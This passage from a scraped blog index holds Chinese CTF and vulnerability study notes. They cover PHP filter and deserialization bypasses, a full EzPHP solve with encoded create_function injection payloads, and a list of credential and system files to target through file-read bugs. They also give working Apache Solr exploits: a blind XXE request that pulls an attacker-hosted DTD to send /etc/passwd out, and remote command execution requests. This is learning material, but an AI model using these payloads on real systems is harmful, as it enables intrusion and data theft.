https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_AREGEXP注入与LIKE注入学习笔记https://xz.aliyun.com/t/8003","categories":[],"tags":[]},{"title":"CTF的知识点小记","slug":"CTF的知识点小记","date":"2021-04-22T03:00:52.000Z","updated":"2021-05-10T16:41:05.668Z","comments":true,"path":"article/925aa49a.html","link":"","permalink":"https://blog.cfyqy.com/article/925aa49a.html","excerpt":"零散的知识点记录","text":"零散的知识点记录 json1.在json环境下： 1%20 %2B \\f \\n \\r \\t \\u0009 \\u000A \\u000B \\u000C \\u000D \\u0020 \\u002B 这些字符会作为mysql分隔符。2.json支持的字符中可以支持unicode编码。转换脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpfunction unicode_encode($str)&#123; $table = [ '\\u002'=&gt;[' ','!','\"','#','$','%','&amp;','\\'','(',')','*','+',',','-','.','/'], '\\u003'=&gt;['0','1','2','3','4','5','6','7','8','9',':',';','&lt;','=','&gt;','?'], '\\u004'=&gt;['@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O'], '\\u005'=&gt;['P','Q','R','S','T','U','V','W','X','Y','Z','[','\\\\',']','^','_'], '\\u006'=&gt;['`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o'], '\\u007'=&gt;['p','q','r','s','t','u','v','w','x','y','z','&#123;','|','&#125;','~'] ]; foreach ($table as $key =&gt; $value) &#123; $i = 0; foreach ($value as $vcode) &#123; $i=$i+1; if($str==$vcode)&#123; return $key.bin2e($i-1); &#125; &#125; &#125;&#125;function bin2e($str)&#123; switch ($str) &#123; case '10': return 'a'; break; case '11': return 'b'; break; case '12': return 'c'; break; case '13': return 'd'; break; case '14': return 'e'; break; case '15': return 'f'; break; default: return $str; break; &#125;&#125;function main($str)&#123; for($i=0;$i&lt;strlen($str);$i++)&#123; echo unicode_encode($str[$i]); &#125;&#125;main('test');?&gt; nodejs关键字过滤绕过可以利用字符串拼接和数组调用（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但注意到单双引号和加号同时被过滤了，我们想要直接输入字符串拼接的话似乎也行不通了。这里我们可以利用反引号来把文本括起来作为字符串 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings ，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串。 比如这里 prototype 被过滤了，我们可以这样书写 1&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; 这样就可以拼接出一个 prototype 字符串,最后payload phpphp函数call_user_func1call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018')); call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。 这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发 __call 方法，造成ssrf去访问flag.php。 php特性PHP的字符串解析特性:PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格） num参数的值如果为字母就会显示页面请求就会错误。可以猜测这里的waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（主要是waf不是用php写的） 123456789$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123; die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123; echo \"you are going to the next ~\";&#125;!--&gt; payload 1?b%20u%20p%20t&#x3D;23333a 利用PHP的字符串解析特性Bypass 反序列化绕过123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == \"1\") &#123; $this-&gt;write(); &#125; else if($this-&gt;op == \"2\") &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(\"Bad Hacker!\"); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(\"Too long!\"); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); &#125; else &#123; $this-&gt;output(\"Failed!\"); &#125; &#125; private function read() &#123; $res = \"\"; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo \"[Result]: &lt;br&gt;\"; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125; if(isset($_GET&#123;'str'&#125;)) &#123; $str = (string)$_GET['str']; if(is_valid($str)) &#123; $obj = unserialize($str); &#125; &#125; 弱类型绕过op，php://filter读取文件，is_valid()两种绕过方式(1). p神在小密圈内曾经发过一个点就是在反序列化时，将s改为S，此时后面的字符串支持16进制表示，因此我们的0x00就可以改写为\\00，因为在is_valid中是将我们序列化后的字符串逐个转为ascii然后进行对比，而因此\\00会被解析为三个字符，且都在允许的范围内，因此可以成功绕过。(2). 这道题因为出题人的php版本较高，前面的绕过还可以用php7.2+的黑魔法，public属性直接反序列化就能用了。 无参数执行123456789101112131415161718192021222324&lt;?phpinclude \"flag.php\";echo \"flag在哪里呢？&lt;br&gt;\";if(isset($_GET['exp']))&#123; if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) &#123; if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) &#123; // echo $_GET['exp']; @eval($_GET['exp']); &#125; else&#123; die(\"还差一点哦！\"); &#125; &#125; else&#123; die(\"再好好想想！\"); &#125; &#125; else&#123; die(\"还想读flag，臭弟弟！\"); &#125;&#125;// highlight_file(__FILE__);?&gt; 其中 1preg_replace(&#39;&#x2F;[a-z,_]+\\((?R)?\\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;]) (和)表示转义括号(?R)?表示引用当前表达式 大致意思就是可以使用函数，但是函数中不能有参数 12345678localeconv() 函数返回一包含本地数字及货币格式信息的数组。scandir() 列出 images 目录中的文件和目录。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos() current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。array_reverse()以相反的元素顺序返回数组。highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。 查看有哪些文件 1?exp&#x3D;print_r(scandir(current(localeconv()))); 打印flag 1?exp&#x3D;highlight_file(next(array_reverse(scandir(current(localeconv()))))); 解释 1234scandir(current(localeconv()))是查看当前目录加上array_reverse()是将数组反转，即Array([0]&#x3D;&gt;index.php[1]&#x3D;&gt;flag.php&#x3D;&gt;[2].git[3]&#x3D;&gt;..[4]&#x3D;&gt;.)再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.phphighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码 preg_replace与代码执行1234567891011121314151617181920&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) &#123; return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). \"\\n\";&#125;function getFlag()&#123; @eval($_GET['cmd']);&#125; paydload 1next.php?\\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;); 详情可看此文章：https://xz.aliyun.com/t/2557 [BJDCTF2020]EzPHP知识点 1234567base32url编码绕过preg_match在非&#x2F;s模式下的绕过$_POST和$_GET的优先级PHP伪协议。sha1函数的数组绕过。create_function()的代码注入 页面源码 找到一个base32的字符串，解码得1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = \"1nD3x.php\";$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo \"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;\";if($_SERVER) &#123; if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); &#125;if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br&gt;\"; &#125; &#125; else die('fxck you! What do you want to do ?!');if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; if (file_get_contents($file) !== 'debu_debu_aqua') die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\");if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[\"flag\"]); echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123; die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125;if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123; die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123; include \"flag.php\"; $code('', $arg); &#125; ?&gt; 考点 一：绕过 QUERY_STRING 的正则匹配 123456if($_SERVER) &#123; if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?');&#125; QUERY_STRING相关知识 123456789101112http:&#x2F;&#x2F;localhost&#x2F;aaa&#x2F;index.php?p&#x3D;222&amp;q&#x3D;333结果：$_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;p&#x3D;222&amp;q&#x3D;333&quot;;$_SERVER[&#39;REQUEST_URI&#39;] &#x3D; &quot;&#x2F;aaa&#x2F;index.php?p&#x3D;222&amp;q&#x3D;333&quot;;$_SERVER[&#39;SCRIPT_NAME&#39;] &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;$_SERVER[&#39;PHP_SELF&#39;] &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;由实例可知：$_SERVER[&quot;QUERY_STRING&quot;] 获取查询 语句，实例中可知，获取的是?后面的值$_SERVER[&quot;REQUEST_URI&quot;] 获取 http:&#x2F;&#x2F;localhost 后面的值，包括&#x2F;$_SERVER[&quot;SCRIPT_NAME&quot;] 获取当前脚本的路径，如：index.php$_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名 由于$_SERVER[&#39;QUERY_STRING&#39;] 不会进行 URLDecode，而 $_GET[] 会，所以只要进行 url 编码即可绕过： 考点二： preg_match在非/s模式绕过 123456if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br&gt;\"; &#125; &#125; else die('fxck you! What do you want to do ?!'); 首先对于file过滤了http和https，然后就是对于GET参数的debu，需要匹配要正则但是又不能和aqua_is_cute这个字符串一样。考虑到preg_match在非/s模式下，会忽略末尾的%0a，因为可以用aqua_is_cute%0a来绕过。又因为aqua_is_cute中有单词被过滤了，因此同样需要用url编码来绕过。 但是$_GET[&quot;file&quot;]又应该怎么给值呢？考虑到这个： 1if (file_get_contents($file) !== 'debu_debu_aqua') 因此利用php的伪协议： 1file=data://text/plain,debu_debu_aqua 考点 三：绕过 $_REQUEST 的字母匹配 123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125;&#125; 也就是说不允许有字母。我也卡在了这里，没有想到如果POST和GET传相同名字的参数结果会是怎么样。因为POST的优先级比GET高，如果参数名相同，最终$_REQUEST中的值应该是POST里那个参数的，因此可以传： 1debu&#x3D;1&amp;file&#x3D;2 这个优先级是由 php 的配置文件决定的，在 php.ini 中 12345678910111213141516171819202122232425; This directive determines which super global arrays are registered when PHP; starts up. G,P,C,E &amp; S are abbreviations for the following respective super; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty; paid for the registration of these arrays and because ENV is not as commonly; used as the others, ENV is not recommended on productions servers. You; can still get access to the environment variables through getenv() should you; need to.; Default Value: \"EGPCS\"; Development Value: \"GPCS\"; Production Value: \"GPCS\";; http://php.net/variables-ordervariables_order = \"GPCS\"; This directive determines which super global data (G,P &amp; C) should be; registered into the super global array REQUEST. If so, it also determines; the order in which that data is registered. The values for this directive; are specified in the same manner as the variables_order directive,; EXCEPT one. Leaving this value empty will cause PHP to use the value set; in the variables_order directive. It does not mean it will leave the super; globals array REQUEST empty.; Default Value: None; Development Value: \"GP\"; Production Value: \"GP\"; http://php.net/request-orderrequest_order = \"GP\" 考点 四：sha1数组绕过 1234567if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[\"flag\"]); echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123; die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125; 考点 五：create_function()的代码注入 1234567if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123; die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\");&#125; else &#123; include \"flag.php\"; $code('', $arg);&#125; 解析create_function() &amp;&amp; 复现wp: https://paper.seebug.org/94/应用到本题： 1$code('', $arg); $code是create_function,因此这个匿名函数可以是这样： 123function test()&#123; $arg;&#125; 让$arg是}var_dump(get_defined_vars);//则变成了这样： 12function test()&#123; &#125;var_dump(get_defined_vars);//&#125; 首先用}闭合掉test函数，然后自己写危险的语句，最终用//把}给注释掉。网上的可能大多是用/，其实如果用/，你就可以理解成这样： 123function test()&#123; &#125;var_dump(get_defined_vars);/*&#125; get_defined_vars — 返回由所有已定义变量所组成的数组 最后 1234567&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;;var_dump(get_defined_vars());&#x2F;&#x2F;&#x2F;1nD3x.php?shana[]&#x3D;1&amp;passwd[]&#x3D;3&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute%0a&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_functionpost:debu&#x3D;&amp;file&#x3D; 这里看到最后的flag在rea1fl4g.php中，使用require加base64编码加取反替代var_dump(get_defined_vars())‘require(php://filter/convert.base64-encode/resource=rea1fl4g.php) 12345&lt;?php$s = 'php://filter/convert.base64-encode/resource=rea1fl4g.php';echo urlencode(~$s);#%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F?&gt; payload 12345&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;post:debu&#x3D;&amp;file&#x3D; url编码的脚本 123456789101112131415161718&lt;?php$s='shana[]=1&amp;passwd[]=3&amp;file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%0a&amp;flag[arg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%99%93%9E%98%D1%8F%97%8F));//&amp;flag[code]=create_function';$result=\"\";for($i=0;$i&lt;strlen($s);$i++)&#123; $tmp=substr($s, $i,1); # print($tmp); if(!strcmp($tmp, \"%\"))&#123; $result .= substr($s, $i,3); $i +=2; continue; &#125; if(preg_match(\"/[a-zA-Z_]/i\", $tmp))&#123; $result .=\"%\".dechex(ord($tmp)); &#125;else&#123; $result .=$tmp; &#125;&#125;print($result); php反序列化原生类利用https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html CTF任意读取重要信息文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556(1)&#x2F;etc目录&#x2F;etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。(2)&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。(3)&#x2F;etc&#x2F;shadow&#x2F;etc&#x2F;shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。(4)&#x2F;etc&#x2F;apache2&#x2F;*&#x2F;etc&#x2F;apache2&#x2F;是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。(5)&#x2F;etc&#x2F;nginx&#x2F;&#x2F;etc&#x2F;nginx&#x2F;是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。(6)&#x2F;etc&#x2F;apparmor(.d)&#x2F;&#x2F;etc&#x2F;apparmor（.d）&#x2F;是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。(7)&lt;code&gt;&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)&lt;&#x2F;code&gt;&#x2F;etc&#x2F;（cron.d&#x2F;|crontab）是定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。(8)&#x2F;etc&#x2F;environment&#x2F;etc&#x2F;environment是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。(9)&#x2F;etc&#x2F;hostname&#x2F;etc&#x2F;hostname表示主机名。(10)&#x2F;etc&#x2F;hosts&#x2F;etc&#x2F;hosts是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。(11)&#x2F;etc&#x2F;issue&#x2F;etc&#x2F;issue指明系统版本。(12)&#x2F;etc&#x2F;mysql&#x2F;*&#x2F;etc&#x2F;mysql&#x2F;是MySQL配置文件。(13)&#x2F;etc&#x2F;php&#x2F;&#x2F;etc&#x2F;php&#x2F;*是PHP配置文件。&#x2F;proc目录&#x2F;proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。注意：如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需&#x2F;proc&#x2F;self&#x2F;代替&#x2F;proc&#x2F;[pid]&#x2F;即可。对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx-pxxxx登录MySQL，会在cmdline中显示明文密码：&#x2F;proc&#x2F;[pid]&#x2F;cmdline ([pid]指向进程所对应的终端命令)有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录：&#x2F;proc&#x2F;[pid]&#x2F;cmd&#x2F; ([pid]指向进程的运行目录）环境变量中可能存在secret_key，这时也可以通过environ进行读取：&#x2F;proc&#x2F;[pid]&#x2F;environ ([pid]指向进程运行时的环境变量)&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[num]读取，这个目录包含了进程打开的每一个文件的链接其他目录Nginx配置文件可能存在其他路径：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;* (源代码安装或其他一些系统)日志文件：&#x2F;var&#x2F;log&#x2F;* (经常出现Apache2的Web应用可读&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access&#x2F;log从而分析日志，盗取其他选手的解题步骤)Apache默认Web根目录：&#x2F;var&#x2F;www&#x2F;html&#x2F;PHP session目录：&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions&#x2F; (泄露用户session)用户目录：[user_dir_you_know]&#x2F;.bash_history (泄露历史执行命令)[user_dir_you_know]&#x2F;.bashrc (部分环境变量)[user_dir_you_know]&#x2F;.ssh&#x2F;id_rsa(.pub) (ssh登录私钥&#x2F;公钥)[user_dir_you_know]&#x2F;.viminfo （vim使用记录）[pid]指向进程所对应的可执行文件。有时我们想读取当前应用的可执行文件再进行分析，但在实际利用时可能存在一些安全措施阻止我们去读可执行文件，这时可以尝试读取&#x2F;proc&#x2F;self&#x2F;exe。例如：&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;(1|2) (读取[pid]指向进程的stdout或stderror或其他)&#x2F;proc&#x2F;[pid]&#x2F;maps ([pid]指向进程的内存映射)&#x2F;proc&#x2F;[pid]&#x2F;(mounts|mountinfo) ([pid]指向进程所在的文件系统挂载情况，CTF常见的是docker环境这时mount会泄露一些敏感路径)&#x2F;proc&#x2F;[pid]&#x2F;net&#x2F;* ([pid]指向进程的网络信息，如读取TCP将获取进程所绑定的TCP端口ARP将泄露网段内网IP信息)","categories":[],"tags":[],"author":"ye1s"},{"title":"Apache-solr相关漏洞","slug":"Apache-solr相关漏洞","date":"2021-04-15T16:00:17.000Z","updated":"2021-04-16T10:02:35.423Z","comments":true,"path":"article/1641caa.html","link":"","permalink":"https://blog.cfyqy.com/article/1641caa.html","excerpt":"Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。","text":"Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 基本概念详情可看：Apache Solr 组件安全概览 环境搭建：Solr 所有版本下载地址 http://archive.apache.org/dist/lucene/solr/下载Solr ,进入bin目录中 1solr.cmd -f -a &quot;-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;10010&quot; -port 8983 -s &quot;G:\\code\\java\\solr-7.1.0\\example\\example-DIH\\solr&quot; 动态调试下载源码，配置Remote即可 Apache solr XML 实体注入漏洞（CVE-2017-12629）此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。 由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）： 替换先dnslog地址，看是否有XXE 123456GET &#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2Fbaidu.com%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&amp;wt&#x3D;xml&amp;defType&#x3D;xmlparser HTTP&#x2F;1.1Host: your-ip:8983Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: close Blind XXE漏洞利用 起一个web服务，放入1.dtd，dtd文件内容如下 12&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#39;:%file;&#39;&gt;&quot;&gt; 请求（记得替换ip地址） 1http:&#x2F;&#x2F;192.168.1.101:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.1.100%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;wt&#x3D;xml&amp;defType&#x3D;xmlparser 漏洞分析：https://paper.seebug.org/425/ Apache Solr 远程命令执行漏洞（CVE-2017-12629）首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数： 123456789POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1Host: 192.168.1.101:8983Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Length: 158&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch &#x2F;tmp&#x2F;success&quot;]&#125;&#125; 然后进行update操作，触发刚才添加的listener： 12345678910POST &#x2F;solr&#x2F;demo&#x2F;update HTTP&#x2F;1.1Host: your-ipAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;jsonContent-Length: 15[&#123;&quot;id&quot;:&quot;test&quot;&#125;] Apache Solr 远程命令执行漏洞（CVE-2019-0193）此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 如上图所示，首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC： 1234567891011121314&lt;dataConfig&gt; &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt; &lt;script&gt;&lt;![CDATA[ function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;); &#125; ]]&gt;&lt;&#x2F;script&gt; &lt;document&gt; &lt;entity name&#x3D;&quot;stackoverflow&quot; url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot; processor&#x3D;&quot;XPathEntityProcessor&quot; forEach&#x3D;&quot;&#x2F;feed&quot; transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt; 